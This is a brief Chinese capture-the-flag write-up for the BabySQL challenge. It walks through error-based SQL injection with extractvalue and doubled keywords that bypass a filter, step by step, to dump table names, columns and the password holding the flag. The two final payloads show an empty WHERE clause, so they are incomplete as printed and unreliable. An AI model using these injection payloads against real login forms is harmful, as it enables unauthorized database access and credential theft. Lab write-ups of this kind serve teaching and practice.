# \[极客大挑战 2019]BabySQL

## \[极客大挑战 2019]BabySQL

## 考点

* SQL注入万能密码登陆
* 报错注入
* 双写Bypass

## wp

过滤了 or and from select where 双写可以绕过\
`admin' aandnd extractvalue(1,concat(0x7e,(select @@version),0x7e)) #`

获取geek库中的表 `admin' anandd extractvalue(1,concat(0x7e,(seselectlect table_name frfromom infoorrmation_schema.tables whwhereere table_schema='geek' limit 0,1),0x7e)) #`

比较关键的是 `b4bsql`，`geekuser`

获取表中的列 `admin' aandnd extractvalue(1,concat(0x7e,(seselectlect group_concat(column_name) ffromrom infoorrmation_schema.columns whwhereere table_name='b4bsql'),0x7e)) #`

两个表中的列都是 `id,username,password`

测试了一下发现 flag 在 b4bsql 的最后一个用户的 password 中

正序输出\
`admin' anandd extractvalue(1,concat(0x7e,(selselectect passwoorrd frfromom b4bsql whwhereere ),0x7e)) #`

逆序输出\
`admin' anandd extractvalue(1,concat(0x7e,(selselectect reverse(passwoorrd) frfromom b4bsql whwhereere ),0x7e)) #`

拼接一下 flag 即可

这里其实没必要成功登陆，只要 sql 语句报错就可以进行注入
